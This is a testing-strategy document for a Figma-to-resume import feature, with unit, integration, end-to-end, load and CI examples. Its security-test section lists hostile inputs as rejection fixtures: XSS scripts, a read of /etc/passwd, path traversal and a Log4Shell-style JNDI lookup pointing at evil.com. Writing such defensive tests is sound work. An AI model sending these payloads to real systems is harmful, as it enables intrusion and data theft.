# Testing Strategy - Figma Integration

## Overview

This document outlines the comprehensive testing strategy for the MCP Figma integration, covering both Use Case 1 (Developer Workflow) and Use Case 2 (User Upload Feature).

## Testing Pyramid

```
                    ▲
                   / \
                  /   \
                 /  E2E \
                /_______\
               /         \
              /Integration \
             /____Tests____\
            /               \
           /   Unit Tests    \
          /_________________\
```

## Test Categories

### 1. Unit Tests (Base Layer - 70%)

#### MCP Server Integration Tests

```typescript
// __tests__/figma-api.test.ts
import { FigmaAPI } from '@/lib/figma-api';

describe('FigmaAPI', () => {
  describe('extractFigmaIds', () => {
    it('should extract file ID from valid URL', () => {
      const url = 'https://figma.com/file/ABC123/Test-File';
      const result = FigmaAPI.extractFigmaIds(url);
      expect(result.fileId).toBe('ABC123');
      expect(result.nodeId).toBeUndefined();
    });

    it('should extract file ID and node ID from URL with node-id', () => {
      const url = 'https://figma.com/file/ABC123/Test-File?node-id=1-23';
      const result = FigmaAPI.extractFigmaIds(url);
      expect(result.fileId).toBe('ABC123');
      expect(result.nodeId).toBe('1:23');
    });

    it('should throw error for invalid URL format', () => {
      const url = 'https://invalid-url.com';
      expect(() => FigmaAPI.extractFigmaIds(url)).toThrow('Invalid Figma URL format');
    });
  });

  describe('fetchDesignData', () => {
    beforeEach(() => {
      process.env.FIGMA_API_KEY = 'test-api-key';
      global.fetch = jest.fn();
    });

    it('should fetch file data successfully', async () => {
      const mockResponse = {
        ok: true,
        json: jest.fn().mockResolvedValue({
          document: { name: 'Test File' }
        })
      };
      
      (global.fetch as jest.Mock).mockResolvedValue(mockResponse);

      const result = await FigmaAPI.fetchDesignData('ABC123');
      expect(global.fetch).toHaveBeenCalledWith(
        'https://api.figma.com/v1/files/ABC123',
        { headers: { 'X-Figma-Token': 'test-api-key' } }
      );
    });

    it('should handle API errors', async () => {
      (global.fetch as jest.Mock).mockResolvedValue({
        ok: false,
        status: 403
      });

      await expect(FigmaAPI.fetchDesignData('ABC123')).rejects.toThrow('Figma API error: 403');
    });
  });
});
```

#### Resume Parser Tests

```typescript
// __tests__/figma-resume-parser.test.ts
import { FigmaToResumeParser } from '@/lib/figma-resume-parser';

describe('FigmaToResumeParser', () => {
  const mockDesignData = {
    nodes: {
      '1:1': {
        document: {
          children: [
            {
              type: 'TEXT',
              characters: 'John Doe',
              style: { fontSize: 32, fontWeight: 600 }
            },
            {
              type: 'TEXT',
              characters: 'Senior Software Engineer',
              style: { fontSize: 18 }
            },
            {
              type: 'TEXT',
              characters: 'john.doe@example.com'
            }
          ]
        }
      }
    }
  };

  it('should extract name from largest text node', async () => {
    const result = await FigmaToResumeParser.parseDesign(mockDesignData);
    expect(result.name).toBe('John Doe');
  });

  it('should extract email from contact information', async () => {
    const result = await FigmaToResumeParser.parseDesign(mockDesignData);
    expect(result.contact.email).toBe('john.doe@example.com');
  });

  it('should extract job title from text with keywords', async () => {
    const result = await FigmaToResumeParser.parseDesign(mockDesignData);
    expect(result.title).toBe('Senior Software Engineer');
  });

  it('should handle empty design data gracefully', async () => {
    const emptyData = { nodes: {} };
    const result = await FigmaToResumeParser.parseDesign(emptyData);
    expect(result.name).toBe('');
    expect(result.contact).toEqual({});
  });
});
```

#### Component Tests

```typescript
// __tests__/components/ResumeUploader.test.tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { ResumeUploader } from '@/src/components/ResumeUploader/ResumeUploader';

describe('ResumeUploader', () => {
  const mockOnResumeUploaded = jest.fn();
  const mockSetIsLoading = jest.fn();

  beforeEach(() => {
    jest.clearAllMocks();
    global.fetch = jest.fn();
  });

  it('should render file and figma upload tabs', () => {
    render(
      <ResumeUploader
        onResumeUploaded={mockOnResumeUploaded}
        isLoading={false}
        setIsLoading={mockSetIsLoading}
      />
    );

    expect(screen.getByText('📄 Upload File')).toBeInTheDocument();
    expect(screen.getByText('🎨 Figma Design')).toBeInTheDocument();
  });

  it('should switch to figma upload mode', () => {
    render(
      <ResumeUploader
        onResumeUploaded={mockOnResumeUploaded}
        isLoading={false}
        setIsLoading={mockSetIsLoading}
      />
    );

    fireEvent.click(screen.getByText('🎨 Figma Design'));
    expect(screen.getByPlaceholderText(/figma.com\/file/)).toBeInTheDocument();
  });

  it('should validate figma URL format', async () => {
    render(
      <ResumeUploader
        onResumeUploaded={mockOnResumeUploaded}
        isLoading={false}
        setIsLoading={mockSetIsLoading}
      />
    );

    fireEvent.click(screen.getByText('🎨 Figma Design'));
    
    const input = screen.getByPlaceholderText(/figma.com\/file/);
    fireEvent.change(input, { target: { value: 'invalid-url' } });
    fireEvent.click(screen.getByText('Import Design'));

    await waitFor(() => {
      expect(screen.getByText(/Please enter a valid Figma URL/)).toBeInTheDocument();
    });
  });

  it('should handle successful figma upload', async () => {
    const mockResponse = {
      ok: true,
      json: jest.fn().mockResolvedValue({
        success: true,
        data: { name: 'John Doe' },
        meta: { method: 'figma', confidence: 0.85 }
      })
    };

    (global.fetch as jest.Mock).mockResolvedValue(mockResponse);

    render(
      <ResumeUploader
        onResumeUploaded={mockOnResumeUploaded}
        isLoading={false}
        setIsLoading={mockSetIsLoading}
      />
    );

    fireEvent.click(screen.getByText('🎨 Figma Design'));
    
    const input = screen.getByPlaceholderText(/figma.com\/file/);
    fireEvent.change(input, { target: { value: 'https://figma.com/file/ABC123/Test' } });
    fireEvent.click(screen.getByText('Import Design'));

    await waitFor(() => {
      expect(mockOnResumeUploaded).toHaveBeenCalledWith(
        { name: 'John Doe' },
        expect.objectContaining({
          method: 'Figma MCP',
          confidence: 0.85
        })
      );
    });
  });
});
```

### 2. Integration Tests (Middle Layer - 20%)

#### API Route Tests

```typescript
// __tests__/api/parse-figma-resume.test.ts
import { POST } from '@/app/api/parse-figma-resume/route';
import { NextRequest } from 'next/server';

// Mock dependencies
jest.mock('@/lib/figma-api');
jest.mock('@/lib/figma-resume-parser');
jest.mock('@/lib/supabase/server');

describe('/api/parse-figma-resume', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('should return 400 for missing figmaUrl', async () => {
    const request = new NextRequest('http://localhost/api/parse-figma-resume', {
      method: 'POST',
      body: JSON.stringify({ isAuthenticated: false })
    });

    const response = await POST(request);
    const data = await response.json();

    expect(response.status).toBe(400);
    expect(data.error).toBe('Figma URL is required');
  });

  it('should return 400 for invalid figma URL', async () => {
    const request = new NextRequest('http://localhost/api/parse-figma-resume', {
      method: 'POST',
      body: JSON.stringify({
        figmaUrl: 'invalid-url',
        isAuthenticated: false
      })
    });

    const response = await POST(request);
    const data = await response.json();

    expect(response.status).toBe(400);
    expect(data.error).toBe('Invalid Figma URL format');
  });

  it('should successfully parse figma design for unauthenticated user', async () => {
    // Mock successful parsing
    const mockParsedResume = { name: 'John Doe', title: 'Engineer' };
    
    require('@/lib/figma-api').FigmaAPI.extractFigmaIds.mockReturnValue({
      fileId: 'ABC123',
      nodeId: '1:23'
    });
    
    require('@/lib/figma-api').FigmaAPI.fetchDesignData.mockResolvedValue({
      document: { name: 'Test Design' }
    });
    
    require('@/lib/figma-resume-parser').FigmaToResumeParser.parseDesign.mockResolvedValue(mockParsedResume);

    const request = new NextRequest('http://localhost/api/parse-figma-resume', {
      method: 'POST',
      body: JSON.stringify({
        figmaUrl: 'https://figma.com/file/ABC123/Test?node-id=1:23',
        isAuthenticated: false
      })
    });

    const response = await POST(request);
    const data = await response.json();

    expect(response.status).toBe(200);
    expect(data.success).toBe(true);
    expect(data.data).toEqual(mockParsedResume);
    expect(data.meta.method).toBe('figma');
  });
});
```

#### Database Integration Tests

```typescript
// __tests__/integration/database.test.ts
import { createClient } from '@supabase/supabase-js';
import { ResumeDatabase } from '@/lib/database';

describe('Database Integration', () => {
  let supabase: any;

  beforeAll(() => {
    supabase = createClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.SUPABASE_SERVICE_ROLE_KEY!
    );
  });

  afterEach(async () => {
    // Clean up test data
    await supabase
      .from('resumes')
      .delete()
      .like('title', 'Test%');
  });

  it('should save figma resume to database', async () => {
    const mockResumeData = {
      userId: 'test-user-id',
      title: 'Test Figma Resume',
      originalFilename: 'figma-design.json',
      fileType: 'application/json',
      fileSize: 1024,
      parsedData: { name: 'John Doe' },
      parseMethod: 'figma',
      confidenceScore: 0.85,
      isPublic: true,
      slug: 'test-figma-resume-1234'
    };

    const result = await ResumeDatabase.saveResume(supabase, mockResumeData);

    expect(result.id).toBeTruthy();
    expect(result.slug).toBe(mockResumeData.slug);

    // Verify in database
    const { data: savedResume } = await supabase
      .from('resumes')
      .select('*')
      .eq('id', result.id)
      .single();

    expect(savedResume.title).toBe(mockResumeData.title);
    expect(savedResume.parse_method).toBe('figma');
  });
});
```

### 3. End-to-End Tests (Top Layer - 10%)

#### User Flow Tests

```typescript
// __tests__/e2e/figma-upload-flow.test.ts
import { test, expect } from '@playwright/test';

test.describe('Figma Upload Flow', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
  });

  test('should complete full figma upload and parsing flow', async ({ page }) => {
    // Navigate to upload section
    await page.click('[data-testid="upload-resume-button"]');

    // Switch to Figma upload
    await page.click('[data-testid="figma-tab"]');

    // Enter Figma URL
    await page.fill(
      '[data-testid="figma-url-input"]',
      'https://figma.com/file/ABC123/Test-Resume?node-id=1:23'
    );

    // Submit upload
    await page.click('[data-testid="import-design-button"]');

    // Wait for loading state
    await expect(page.locator('[data-testid="loading-indicator"]')).toBeVisible();

    // Verify successful processing
    await expect(page.locator('[data-testid="success-message"]')).toBeVisible({
      timeout: 10000
    });

    // Check that resume data is displayed
    await expect(page.locator('[data-testid="resume-preview"]')).toBeVisible();
    await expect(page.locator('text=John Doe')).toBeVisible();
  });

  test('should handle invalid figma URL gracefully', async ({ page }) => {
    await page.click('[data-testid="upload-resume-button"]');
    await page.click('[data-testid="figma-tab"]');

    // Enter invalid URL
    await page.fill('[data-testid="figma-url-input"]', 'invalid-url');
    await page.click('[data-testid="import-design-button"]');

    // Verify error message
    await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
    await expect(page.locator('text=Please enter a valid Figma URL')).toBeVisible();
  });

  test('should handle authentication flow for logged-in users', async ({ page }) => {
    // Mock authentication
    await page.evaluate(() => {
      localStorage.setItem('supabase.auth.token', 'mock-token');
    });

    await page.click('[data-testid="upload-resume-button"]');
    await page.click('[data-testid="figma-tab"]');
    
    await page.fill(
      '[data-testid="figma-url-input"]',
      'https://figma.com/file/ABC123/Test-Resume'
    );
    
    await page.click('[data-testid="import-design-button"]');

    // Should see save confirmation for authenticated users
    await expect(page.locator('text=Resume saved successfully')).toBeVisible();
  });
});
```

#### Developer Workflow Tests

```typescript
// __tests__/e2e/developer-workflow.test.ts
import { test, expect } from '@playwright/test';

test.describe('Developer MCP Workflow', () => {
  test.skip(() => process.env.CI === 'true', 'Skipping MCP tests in CI');

  test('should generate component from figma design', async ({ page }) => {
    // This test requires actual MCP server setup
    // Skip in CI environment

    await page.goto('/dev/component-generator');

    // Enter Figma URL
    await page.fill(
      '[data-testid="figma-design-input"]',
      'https://figma.com/file/ABC123/Button-Component?node-id=1:23'
    );

    // Generate component
    await page.click('[data-testid="generate-component-button"]');

    // Wait for generation
    await expect(page.locator('[data-testid="generated-code"]')).toBeVisible({
      timeout: 30000
    });

    // Verify TypeScript code
    const generatedCode = await page.locator('[data-testid="typescript-output"]').textContent();
    expect(generatedCode).toContain('export const');
    expect(generatedCode).toContain('interface');
    expect(generatedCode).toContain('.module.css');

    // Verify CSS code
    const generatedCSS = await page.locator('[data-testid="css-output"]').textContent();
    expect(generatedCSS).toContain('.container');
    expect(generatedCSS).not.toContain('Tailwind');
  });
});
```

## Performance Tests

### Load Testing

```typescript
// __tests__/performance/figma-api-load.test.ts
import { performance } from 'perf_hooks';

describe('Figma API Performance', () => {
  test('should handle concurrent requests efficiently', async () => {
    const concurrentRequests = 10;
    const figmaUrl = 'https://figma.com/file/ABC123/Test';

    const startTime = performance.now();

    const promises = Array(concurrentRequests).fill(null).map(() =>
      fetch('/api/parse-figma-resume', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ figmaUrl, isAuthenticated: false })
      })
    );

    const results = await Promise.all(promises);
    const endTime = performance.now();

    const totalTime = endTime - startTime;
    const averageTime = totalTime / concurrentRequests;

    expect(averageTime).toBeLessThan(5000); // 5 seconds max per request
    expect(results.every(r => r.ok)).toBe(true);
  });

  test('should respect rate limiting', async () => {
    // Test rate limiting behavior
    const requests = Array(1005).fill(null).map((_, i) =>
      fetch('/api/parse-figma-resume', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          figmaUrl: `https://figma.com/file/ABC${i}/Test`,
          isAuthenticated: false
        })
      })
    );

    const results = await Promise.allSettled(requests);
    const rateLimitedRequests = results.filter(r => 
      r.status === 'fulfilled' && r.value.status === 429
    );

    expect(rateLimitedRequests.length).toBeGreaterThan(0);
  });
});
```

## Security Tests

### Input Validation Tests

```typescript
// __tests__/security/input-validation.test.ts
describe('Security - Input Validation', () => {
  const maliciousInputs = [
    'javascript:alert("xss")',
    '<script>alert("xss")</script>',
    'https://evil.com/figma-lookalike',
    'file:///etc/passwd',
    'data:text/html,<script>alert("xss")</script>',
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    'https://figma.com/file/../../admin'
  ];

  maliciousInputs.forEach(input => {
    test(`should reject malicious input: ${input}`, async () => {
      const response = await fetch('/api/parse-figma-resume', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          figmaUrl: input,
          isAuthenticated: false
        })
      });

      expect(response.status).toBe(400);
      const data = await response.json();
      expect(data.error).toBeTruthy();
    });
  });

  test('should sanitize extracted content', async () => {
    const mockDesignData = {
      nodes: {
        '1:1': {
          document: {
            children: [{
              type: 'TEXT',
              characters: '<script>alert("xss")</script>John Doe'
            }]
          }
        }
      }
    };

    const result = await FigmaToResumeParser.parseDesign(mockDesignData);
    expect(result.name).not.toContain('<script>');
    expect(result.name).toBe('John Doe');
  });
});
```

## Test Data Management

### Fixtures

```typescript
// __tests__/fixtures/figma-design-data.ts
export const mockFigmaDesignData = {
  basic: {
    nodes: {
      '1:1': {
        document: {
          name: 'Resume Design',
          children: [
            {
              id: '1:2',
              type: 'TEXT',
              characters: 'John Doe',
              style: { fontSize: 32, fontWeight: 600 }
            },
            {
              id: '1:3',
              type: 'TEXT',
              characters: 'Senior Software Engineer',
              style: { fontSize: 18 }
            }
          ]
        }
      }
    }
  },

  complex: {
    nodes: {
      '1:1': {
        document: {
          name: 'Complex Resume',
          children: [
            // Header section
            {
              id: '1:2',
              name: 'Header',
              children: [
                {
                  id: '1:3',
                  type: 'TEXT',
                  characters: 'John Doe',
                  style: { fontSize: 32 }
                },
                {
                  id: '1:4',
                  type: 'TEXT',
                  characters: 'john.doe@example.com'
                }
              ]
            },
            // Experience section
            {
              id: '1:5',
              name: 'Experience',
              children: [
                {
                  id: '1:6',
                  type: 'TEXT',
                  characters: 'Experience'
                },
                {
                  id: '1:7',
                  type: 'TEXT',
                  characters: 'Software Engineer at Tech Corp'
                }
              ]
            }
          ]
        }
      }
    }
  }
};
```

### Test Utilities

```typescript
// __tests__/utils/test-helpers.ts
export function createMockRequest(body: any): NextRequest {
  return new NextRequest('http://localhost/api/parse-figma-resume', {
    method: 'POST',
    body: JSON.stringify(body),
    headers: { 'Content-Type': 'application/json' }
  });
}

export function createMockFigmaResponse(data: any) {
  return {
    ok: true,
    json: jest.fn().mockResolvedValue(data)
  };
}

export async function waitForCondition(
  condition: () => boolean | Promise<boolean>,
  timeout = 5000
): Promise<void> {
  const start = Date.now();
  
  while (Date.now() - start < timeout) {
    if (await condition()) return;
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  throw new Error(`Condition not met within ${timeout}ms`);
}
```

## Test Execution Strategy

### Local Development

```bash
# Run all tests
npm test

# Run specific test suites
npm run test:unit
npm run test:integration
npm run test:e2e

# Run tests in watch mode
npm run test:watch

# Run tests with coverage
npm run test:coverage

# Run performance tests
npm run test:performance

# Run security tests
npm run test:security
```

### CI/CD Pipeline

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm ci
      - run: npm run test:unit
      - run: npm run test:coverage

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run test:integration
    env:
      FIGMA_API_KEY: ${{ secrets.FIGMA_API_KEY_TEST }}

  e2e-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run build
      - run: npm run test:e2e
```

## Quality Gates

### Coverage Requirements
- **Unit Tests**: Minimum 80% code coverage
- **Integration Tests**: All API endpoints covered
- **E2E Tests**: Critical user flows covered

### Performance Benchmarks
- **API Response Time**: < 3 seconds average
- **Page Load Time**: < 2 seconds
- **Memory Usage**: < 512MB during processing

### Security Standards
- **Input Validation**: 100% coverage for user inputs
- **Authentication**: All protected endpoints tested
- **Data Sanitization**: All extracted content sanitized

This comprehensive testing strategy ensures the reliability, security, and performance of the Figma integration while maintaining high code quality standards.